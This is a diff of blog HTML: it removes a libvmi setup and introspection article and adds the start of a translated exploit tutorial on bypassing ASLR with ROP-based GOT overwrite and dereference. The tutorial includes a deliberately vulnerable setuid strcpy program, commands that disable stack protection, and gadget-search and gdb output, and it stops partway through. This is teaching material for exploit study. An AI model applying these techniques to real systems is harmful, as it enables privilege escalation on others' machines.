-<p>After that, we can connect to our DomU using vnc:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ gvncviewer localhost</div></pre></td></tr></table></figure></p>
-<h3 id="0x04-libvmi-setup"><a href="#0x04-libvmi-setup" class="headerlink" title="0x04 libvmi setup"></a>0x04 libvmi setup</h3><p>After all the above environment is ready, we can now compile our libvmi and try to use some of its examples:</p>
-<p>We first download the source code from <a href="https://github.com/libvmi/libvmi" target="_blank" rel="external">here</a>, and <code>cd</code> enter it,<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./autogen.sh</div></pre></td></tr></table></figure></p>
-<p>Error: could not find libtoolize or glibtoolize<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install libtool</div></pre></td></tr></table></figure></p>
-<p>Error: aclocal not found<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install automake autoconf</div></pre></td></tr></table></figure></p>
-<p>Then:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./configure</div></pre></td></tr></table></figure></p>
-<p>Error: Package requirements (glib-2.0 &gt;= 2.16) were not met<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install libglib2<span class="number">.0</span>-dev</div></pre></td></tr></table></figure></p>
-<p>Error: Package requirements (check &gt;= 0.9.4) are not met:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install check</div></pre></td></tr></table></figure></p>
-<p>Then:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ make</div><div class="line">$ sudo ldconfig</div><div class="line">$ <span class="function">sudo make <span class="title">install</span>  <span class="params">(optional)</span></span></div></pre></td></tr></table></figure></p>
-<p>Actually, after we successfully <code>make</code>, we can already use it. Before that, we firstly need to provide a config file: <code>/etc/libvmi.conf</code>:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">ubuntu &#123;</div><div class="line">    sysmap      = <span class="string">"directory-to-sysmap/System.map-3.5.0-23-generic"</span>;</div><div class="line">    ostype      = <span class="string">"Linux"</span>;</div><div class="line">    linux_tasks = <span class="number">0x240</span>;</div><div class="line">    linux_name  = <span class="number">0x460</span>;</div><div class="line">    linux_mm    = <span class="number">0x278</span>;</div><div class="line">    linux_pid   = <span class="number">0x2b4</span>;</div><div class="line">    linux_pgd   = <span class="number">0x48</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>These options are:</p>
-<p><figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/Libvmi%20Setup.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/Libvmi%20Setup.png" width="450"></a><br>    <figcaption></figcaption><br></figure><br>Also, libvmi provide a tool in <code>libvmi/tools/linux-offset-finder/</code>, you can copy this directory to the DomU, compile it, and then:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo insmod findoffsets.ko</div></pre></td></tr></table></figure></p>
-<p>then, look the log of the system:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ dmesg</div></pre></td></tr></table></figure></p>
-<p>to get these offsets automatically.</p>
-<p>Meanwhile, libvmi provide some straight forward examples, like<code>process-list</code>, <code>dump-memory</code>, etc., and we can use them (process-list as example):<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo ./examples/process-<span class="built_in">list</span> ubuntu</div></pre></td></tr></table></figure></p>
-<p>Here <code>ubuntu</code>means the name of the DomU, the same as shown when we run:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo xm <span class="built_in">list</span></div></pre></td></tr></table></figure></p>
-<p>Then it will list all of the processes running in the ubuntu DomU.</p>
-<hr>
-<p>Other usages of libvmi, as well as how to write our own introspection tools is introduced <a href="http://ytliu.info/blog/2013/08/14/write-introspection-tools-using-libvmi/" target="_blank" rel="external">here</a>.</p>
-<hr>
-<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/libvmisetup/" target="_blank" rel="external">Libvmi Setup</a>》</p>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/kvmsource-intro/" target="_blank" rel="external">KVM源码分析之基本工作原理</a>》</p>
 
       
     </div>
     <footer class="entry-meta entry-footer">
       
 	<span class="ico-folder"></span>
-    <a class="article-category-link" href="/categories/虚拟机监控/">虚拟机监控<span class="article-category-count">6</span></a>
+    <a class="article-category-link" href="/categories/虚拟化原理/">虚拟化原理<span class="article-category-count">5</span></a>
 
 
       
   <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Introspection/">Introspection</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Libvmi/">Libvmi</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Virtualization/">Virtualization</a></li></ul>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/KVM/">KVM</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/QEMU/">QEMU</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Virtualization/">Virtualization</a></li></ul>
 
       
     </footer>
@@ -283,7 +190,7 @@
 <!-- Table of Contents -->
 
   
-    <article id="post-libvmiintro"  class="article article-type-post" itemscope itemprop="blogPost" >
+    <article id="post-bypassaslr-gotgor"  class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
     
     
@@ -291,7 +198,7 @@
         
   
     <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/20170102/libvmiintro/">Libvmi原理</a>
+      <a class="article-title" href="/20170102/bypassaslr-gotgor/">绕过ASLR-第三篇章(GOT覆盖与GOT解引用)</a>
     </h1>
   
 
@@ -299,70 +206,171 @@
     
     <div class="article-meta">
       
-	Posted on <a href="/20170102/libvmiintro/" class="article-date">
-	  <time datetime="2017-01-02T02:40:14.000Z" itemprop="datePublished">一月 2, 2017</time>
+	Posted on <a href="/20170102/bypassaslr-gotgor/" class="article-date">
+	  <time datetime="2017-01-02T11:23:28.000Z" itemprop="datePublished">一月 2, 2017</time>
 	</a>
 
     </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <p>作者：<a href="http://yandong.org/?p=278#more-278" target="_blank" rel="external">yandong</a><br>编辑： @Tula</p>
+        <p>作者: <a href="http://www.csyssec.org/about" target="_blank" rel="external">CSysSec出品</a></p>
 <hr>
-<p><strong>CSysSec注</strong>： Libvmi是佐治亚理工大学PhD毕业生Bryan Payne写的一套从外部监控虚拟机内部行为的API框架，更多详细信息可以见其主页： <a href="http://libvmi.com/" target="_blank" rel="external">libvmi</a><br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/libvmiintro/" target="_blank" rel="external">Libvmi原理</a>》与作者信息：<a href="http://yandong.org/?p=278#more-278" target="_blank" rel="external">yandong</a></p>
+<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/bypassaslr-gotgor" target="_blank" rel="external">Linux(X86)漏洞利用系列-绕过ASLR-第三篇章(GOT覆盖与GOT解引用)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
 <hr>
 <blockquote>
 <ul>
-<li>0X00 Libvmi简介</li>
-<li>0X01 语义鸿沟</li>
-<li>0X02 Libvmi的使用区别</li>
-<li>0X03 内核结构体的遍历</li>
-<li>0X04 符号表</li>
+<li>0X01 什么是GOT覆盖</li>
+<li>0X02 什么是GOT解引用</li>
+<li>0X03 什么是ROP</li>
+<li>0X04 什么是gadgets</li>
+<li>0X05 如何在可执行文件中找出合适的gadgets</li>
+<li>0X06 利用ROP做到GOT覆盖</li>
+<li>0X07 利用ROP做到GOT解引用</li>
+<li>0X08 ROP gadget人工搜索</li>
 </ul>
 </blockquote>
-<h3 id="0x00-Libvmi简介"><a href="#0x00-Libvmi简介" class="headerlink" title="0x00 Libvmi简介"></a>0x00 Libvmi简介</h3><p>Libvmi是一个能够访问正在运行中的虚拟机底层信息的函数库，这些信息包括虚拟机内存信息、寄存器信息以及一些硬件支持拦截的事件。Libvmi最大贡献在于使得虚拟机自省更加方便。Libvmi可以支持Xen、KVM和QEMU等虚拟化平台。其主要部署在宿主操作系统或者特权虚拟机上，可以支持Windows和linux等主流操作系统，并且可以与著名取证工具Volatility协作。</p>
-<p>Libvmi是从XenAccess项目发展而来，其主要的处理流程如下所述。首先，自省程序需要获取内核的符号信息。然后，Libvmi需要找到内核符号的虚拟地址。接着，Libvmi需要根据内核页目录、页表等找到正确的数据页，并把对应虚拟内存地址上的数据返回给自省程序。而且，凭借着多级缓存技术，Libvmi能够快速的访问虚拟机的内存，从而极大的提升自省工具的性能。</p>
-<h3 id="0x01-语义鸿沟"><a href="#0x01-语义鸿沟" class="headerlink" title="0x01 语义鸿沟"></a>0x01 语义鸿沟</h3><p>语义鸿沟问题是虚拟机自省的一大难点，同时也是使用Libvmi进行监控的难点，Libvmi提供的只是访问虚拟机内存的功能而已。如下图所示，在虚拟化架构中，我们可以从虚拟机管理器(VMM)从获取虚拟机的信息，并且具有很好的透明性和隔离性。</p>
-<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/Libvmi01.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/Libvmi01.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
-
-
-<p>但是，从虚拟机管理器层所看到的虚拟机的信息都是0和1等低层次的二进制信息，但是我们又期望能获取想进程列表等高层语义信息，这之间的差别就是语义鸿沟</p>
-<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/Libvmi02.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/Libvmi02.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
-
-
-<p>解决语义鸿沟需要具备以下两个条件：</p>
-<p>(1)能够访问虚拟机的内存 (libvmi)</p>
-<p>(2)拥有丰富的符号表信息 (结构体之间的关系，结构体的详细定义，结构体中各变量的偏移，长度等等。如常用的进程，文件，端口等信息)</p>
-<h3 id="0x02-Libvmi的使用区别"><a href="#0x02-Libvmi的使用区别" class="headerlink" title="0x02 Libvmi的使用区别"></a>0x02 Libvmi的使用区别</h3><p><strong>(1)正常方式：</strong></p>
-<p>使用“-&gt;”操作符引用结构体中的变量。</p>
-<p><strong>(2)VMI方式：</strong></p>
-<p>需要先计算结构体的起始地址加上变量相对于结构体的偏移地址，再使用读内存函数(Read)读取该变量的值。</p>
-<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/Libvmi03.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/Libvmi03.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
-
-
-<h3 id="0x03-内核结构体的遍历"><a href="#0x03-内核结构体的遍历" class="headerlink" title="0x03 内核结构体的遍历"></a>0x03 内核结构体的遍历</h3><p>归根到底，使用libvmi获取信息，需要知道对内核结构体有足够的了解。如下图，分别为如何获取进程列表和文件信息。</p>
-<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/Libvmi04.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/Libvmi04.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
-
-<p><figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/Libvmi05.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/Libvmi05.png" width="450"></a><br>    <figcaption></figcaption><br></figure></p>
-<h3 id="0x04-符号表"><a href="#0x04-符号表" class="headerlink" title="0x04 符号表"></a>0x04 符号表</h3><p>   符号表就是在虚拟机内部函数或者变量中可供引用的函数或者变量符号表。通过内核符号表，我们便可以知道内核中结构体的组成、变量的偏移地址等等信息。对于普通的内核模块，我们可以直接使用一些全局的变量或者使用“-&gt;”操<br>作符来引用结构体中元素。但对于部署在虚拟机外部的虚拟机自省工具而言，其无法享受这种便利，而只能根据预先计算的起始地址加上变量的偏移来读写变量。因<br>而，符号表对于虚拟机自省而言至关重要，是解决语义鸿沟问题的重要工具。而除了虚拟机自省，取证和调试等其他领域也需要符号表。</p>
-<p> 对于Windows系统，Microsoft提供了完善的符号表信息，其中包括xp、vista和Windows<br>7等等不同的版本，以及32位和64位不同的架构。著名的取证工具Volatility中便带有完整的各个版本和架构的Windows符号信息。</p>
-<p>对于Linux，目前有三种获取符号信息的方式。</p>
-<p>(1)首先，我们可以从System.map文件中获取符号信息，如init_task进程结构体的起始地址，但是其包含的信息有限。</p>
-<p>(2)其次，可以通过编写简单的内核模块来计算结构体的组成及其中各元素的偏移，如Libvmi便使用这种方法来获取一些符号信息。这种方法的缺点是不适合获取较为完整或者大量的信息，因为那将导致极大的工作量。</p>
-<p>(3)另外一种方法是利用ELF文件中调试信息，如DWARF格式。DWARF的全称是“Debugging<br>With Attributed Record Formats”，遵从GNU<br>FDL授权，是一种调试信息的存储格式。如果在编译阶段加入调试参数，编译器会从源文件中收集变量名、函数名、变量和函数类型，<br>以及相应的行号等信息，并遵循特定的格式规范将这些信息存储懂到文件中。之后，在进行调试的时，调试器能够解析这种格式从而获得变量、函数等相关信息。而DWARF提了一个非常通用的方案来描述如何定位由一个变量代表的数据，从而为调试、取证以及虚拟机自省提供了方便。如Volatility便是利用DWARF技术来获取所需的Linux的符号信息。</p>
 <hr>
-<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/libvmiintro/" target="_blank" rel="external">Libvmi原理</a>》与作者信息：<a href="http://yandong.org/?p=278#more-278" target="_blank" rel="external">yandong</a></p>
+<p><u>阅读基础</u>:<br>    <a href="">经典栈缓冲区溢出</a><br>    <a href="">绕过ASLR-第一篇章(return-to-plt)</a><br><u>VM Setup</u>: Ubuntu 12.04(x86)</p>
+<p>在这篇文章中，我们来看看如何利用GOT覆盖与GOT解引用技术来绕过共享库的随机化。正如在<a href="http://www.csyssec.org/20170101/bypassaslr-returntoplt/" target="_blank" rel="external">第一篇章</a>提到的那样，尽管可执行文件没有必需的PLT存根代码，攻击者也能利用GOT覆盖和GOT解引用技术来绕过ASLR。</p>
+<p><u>漏洞代码</u>:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// vuln.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line"> <span class="keyword">int</span> i;</div><div class="line"> seteuid(getuid());</div><div class="line"> <span class="keyword">if</span>(argc &lt; <span class="number">2</span>) &#123;</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Need an argument\n"</span>);</div><div class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line"> &#125;</div><div class="line"> <span class="built_in">strcpy</span>(buf, argv[<span class="number">1</span>]);</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"%s\nLen:%d\n"</span>, buf, (<span class="keyword">int</span>)<span class="built_in">strlen</span>(buf));</div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><u>编译命令</u>：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 2 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -fno-<span class="built_in">stack</span>-protector -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
+<p><u>注意</u>：</p>
+<ul>
+<li>system@PLT并没有出现在我们的可执行文件’vuln’中</li>
+<li>字符串”sh”也没有出现在我们的可执行文件’vuln’中</li>
+</ul>
+<h3 id="0X01-什么是GOT覆盖"><a href="#0X01-什么是GOT覆盖" class="headerlink" title="0X01 什么是GOT覆盖"></a>0X01 什么是GOT覆盖</h3><p>这项技术可以帮助攻击者利用另一个libc函数的地址来覆盖一个特定libc函数的GOT表项。举个例子，GOT[getuid]含有getuid的函数地址(在第一次调用之后)，当偏移差(offset difference)添加到GOT[getuid]表项时，它可以被execve的函数地址覆盖。我们已经<a href="http://www.csyssec.org/20161231/returntolibc/" target="_blank" rel="external">知道</a>，在共享库中，函数从基地址的偏移总是一个常量。因此，如果我们将两个libc函数（execve与getuid）的偏移差添加到getuid的GOT表项中，我们就可以获取execve函数的地址。之后，就可以通过调用getuid来滴啊用execve!!</p>
+<pre><code>offset_diff = execve_addr - getuid_addr
+GOT[execve] = GOT[getuid] + offset_diff
+</code></pre><h3 id="0X02-什么是GOT解引用"><a href="#0X02-什么是GOT解引用" class="headerlink" title="0X02 什么是GOT解引用"></a>0X02 什么是GOT解引用</h3><p>这和GOT覆盖技术类似，但并不是覆盖一个特定libc函数的GOT表项，而是将GOT表项中的值拷贝到一个寄存器中并将偏移差添加到寄存器的内容中。因此现在寄存器就有了必需的libc函数地址。举个例子，GOT[getuid]含有getuid的函数地址，函数地址被拷贝到一个寄存器中。两个libc函数（execve与getuid）的偏移差添加到寄存器的内容中。现在可以跳转到寄存器的值中来调用execve!</p>
+<pre><code>offset_diff = execve_addr - getuid_addr
+eax = GOT[getuid]
+eax = eax + offset_diff
+</code></pre><p>这两种技术看起来很类似，但在运行期间出现缓冲区溢出时如何操作它们呢？ 我们需要识别出一个函数（用来执行这些运算并将结果放入寄存器中）,然后跳转到那个特定的函数来做到GOT覆盖/GOT解引用。 显然的是，在libc与我们的可执行文件中并没有一个单独的函数专门来做这件事！！ 这种情况下，我们就要利用ROP技术了。</p>
+<h3 id="0X03-什么是ROP"><a href="#0X03-什么是ROP" class="headerlink" title="0X03 什么是ROP"></a>0X03 什么是ROP</h3><p>虽然没有一种直接了当的方法，<a href="http://en.wikipedia.org/wiki/Return-oriented_programming" target="_blank" rel="external">ROP</a>可以帮助攻击者一旦获取调用栈的控制权后，就可以执行构造好的机器指令来达到自己的目的<br>。举个例子，在return-to-libc攻击中，我们用system()的地址覆盖返回地址来执行system()。但如果system函数(以及execve函数簇)从libc共享库中脱离，攻击中就不能获取root shell。在这种情况下，ROP就可以用来拯救攻击者了。利用ROP技术，尽管在没有任何必需的libc函数的情况下，攻击者也可以执行一系列的gadgets来模拟必需的libc函数。</p>
+<h3 id="0X04-什么是gadgets"><a href="#0X04-什么是gadgets" class="headerlink" title="0X04 什么是gadgets"></a>0X04 什么是gadgets</h3><p>gadgets是以’ret’指令结尾的一串指令。攻击中利用一个gadget地址来覆盖返回地址，这个gadget中含有与system()前几个汇编指令类似的汇编指令串。因此，返回到这个gadget地址就能执行system()的一部分功能。system()剩余的功能可以通过返回到其它的gadget中来完成。利用这种方法，链接一系列gadgets就能完整模拟system()的功能。因此，就算system()被脱离，也能照样被执行！</p>
+<h3 id="0X05-如何在可执行文件中找出合适的gadgets"><a href="#0X05-如何在可执行文件中找出合适的gadgets" class="headerlink" title="0X05 如何在可执行文件中找出合适的gadgets"></a>0X05 如何在可执行文件中找出合适的gadgets</h3><p>事实证明，可以利用gadget工具。有许多工具(比如<a href="https://github.com/packz/ropeme" target="_blank" rel="external">ropeme</a>,<a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="external">ROPgadget</a>,<a href="https://github.com/0vercl0k/rp" target="_blank" rel="external">rp++</a>)可以帮助攻击者在二进制文件中找出gadgets。这些工具的基本思想都是找出’ret’指令，然后往回找出一系列有用的机器指令。</p>
+<p>在我们的例子中，我们不必去利用ROP gadgets来模拟任何libc函数的功能。取而代之的是，我们需要覆盖一个libc函数的GOT表项或者保证任一的寄存器指向一个libc函数地址。让我们来看看如何利用ROP gadgets来实现GOT覆盖与GOT解引用吧！</p>
+<h3 id="0X06-利用ROP做到GOT覆盖"><a href="#0X06-利用ROP做到GOT覆盖" class="headerlink" title="0X06 利用ROP做到GOT覆盖"></a>0X06 利用ROP做到GOT覆盖</h3><p>-Gadget 1: 首先我们需要一个gadget将偏移差添加到GOT[getuid]中。因此，我们要找出一个add gadget用来将结果拷贝到内存区域。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">$ ~/roptools/rp++ --atsyntax -f ./vuln -r 1</div><div class="line">Trying to open './vuln'..</div><div class="line">Loading ELF information..</div><div class="line">FileFormat: Elf, Arch: Ia32</div><div class="line">Using the AT&amp;T syntax..</div><div class="line"></div><div class="line">Wait a few seconds, rp++ is looking for gadgets..</div><div class="line">in PHDR</div><div class="line">0 found.</div><div class="line"></div><div class="line">in LOAD</div><div class="line">65 found.</div><div class="line"></div><div class="line">A total of 65 gadgets found.</div><div class="line">...</div><div class="line">0x080486fb: addb %dh, -0x01(%esi,%edi,8) ; jmpl *0x00(%ecx) ; (1 found)</div><div class="line">0x0804849e: addl %eax, 0x5D5B04C4(%ebx) ; ret ; (1 found)</div><div class="line">...</div><div class="line">$</div></pre></td></tr></table></figure>
+<p>太棒了！ 我们找到了一个’add gadget’用来将结果拷贝到内存区域！<br>现在，如果我们EBX中含有GOT[getuid]-0x5d5b04c4, EAX中含有偏移差，我们就可以执行GOT覆盖了！</p>
+<p>-Gadget 2: 确保EBX中含有getuid的GOT表项。getuid的GOT表项(如下所示)位于0x8041004处。因此，EBX必须要读入0x804a004, 但是在add gadget中一个常量(0x5d5b04c4)添加到了EBX中，我们就从EBX中减去那个常量： ebx =0x804a004 -0x5d5b04c4 = 0xaaa99b40。 现在我们需要找到一个gadget用来将这个值(0xaaa99b40)拷贝到EBX寄存器中。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">$ objdump -R vuln</div><div class="line">vuln: file format elf32-i386</div><div class="line"></div><div class="line">DYNAMIC RELOCATION RECORDS</div><div class="line">OFFSET TYPE VALUE </div><div class="line">08049ff0 R_386_GLOB_DAT __gmon_start__</div><div class="line">0804a000 R_386_JUMP_SLOT printf</div><div class="line">0804a004 R_386_JUMP_SLOT getuid</div><div class="line">...</div><div class="line">$ ~/roptools/rp++ --atsyntax -f ./vuln -r 1</div><div class="line">Trying to open './vuln'..</div><div class="line">Loading ELF information..</div><div class="line">FileFormat: Elf, Arch: Ia32</div><div class="line">Using the AT&amp;T syntax..</div><div class="line"></div><div class="line">Wait a few seconds, rp++ is looking for gadgets..</div><div class="line">in PHDR</div><div class="line">0 found.</div><div class="line"></div><div class="line">in LOAD</div><div class="line">65 found.</div><div class="line"></div><div class="line">A total of 65 gadgets found.</div><div class="line">...</div><div class="line">0x08048618: popl %ebp ; ret ; (1 found)</div><div class="line">0x08048380: popl %ebx ; ret ; (1 found)</div><div class="line">0x08048634: popl %ebx ; ret ; (1 found)</div><div class="line">...</div><div class="line">$</div></pre></td></tr></table></figure>
+<p>太棒了！ 我们找到一个’pop gadget’! 因此，在将值(0xaaa99b40)push到栈中之后，再返回到“pop EBX”指令，EBX中就有了0xaaa99b40.</p>
+<p>-Gadget 3: 确保EAX含有偏移差。 我们需要找到一个gadget将偏移差拷贝到EAX寄存器中。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">$ gdb -q vuln</div><div class="line">...</div><div class="line">(gdb) p execve</div><div class="line">$1 = &#123;&#125; 0xb761a1f0 </div><div class="line">(gdb) p getuid</div><div class="line">$2 = &#123;&#125; 0xb761acc0 </div><div class="line">(gdb) p/x execve - getuid</div><div class="line">$4 = 0xfffff530</div><div class="line">(gdb) </div><div class="line">...</div><div class="line">$ ~/roptools/rp++ --atsyntax -f ./vuln -r 1</div><div class="line">Trying to open './vuln'..</div><div class="line">Loading ELF information..</div><div class="line">FileFormat: Elf, Arch: Ia32</div><div class="line">Using the AT&amp;T syntax..</div><div class="line"></div><div class="line">Wait a few seconds, rp++ is looking for gadgets..</div><div class="line">in PHDR</div><div class="line">0 found.</div><div class="line"></div><div class="line">in LOAD</div><div class="line">65 found.</div><div class="line"></div><div class="line">A total of 65 gadgets found.</div><div class="line">...</div><div class="line">0x080484a3: popl %ebp ; ret ; (1 found)</div><div class="line">0x080485cf: popl %ebp ; ret ; (1 found)</div><div class="line">0x08048618: popl %ebp ; ret ; (1 found)</div><div class="line">0x08048380: popl %ebx ; ret ; (1 found)</div><div class="line">0x08048634: popl %ebx ; ret ; (1 found)</div><div class="line">...</div><div class="line">$</div></pre></td></tr></table></figure>
+<p>因此，只要将偏移差(0xfffff530)push到栈中，然后返回到“pop EAX”指令，就能将偏移差拷贝到EAX中。但不幸的是，在我们的二进制文件‘vuln’中并不能找到’pop % eax; ret’ gadget。因此，GOT覆盖就变得不可能了。</p>
+<p><u>栈布局</u>： 下图描绘了利用gadget链接来做到GOT覆盖</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/alsrgotgor1.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/alsrgotgor1.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+
+<h3 id="0X07-利用ROP做到GOT解引用"><a href="#0X07-利用ROP做到GOT解引用" class="headerlink" title="0X07 利用ROP做到GOT解引用"></a>0X07 利用ROP做到GOT解引用</h3><p>-Gadget 1: 首先，我们需要一个gadget来讲偏移差添加到GOT[getuid]中，结果需要加载到寄存器中。因此，我们来找出一个’add gadget’将结果拷贝到寄存器中</p>
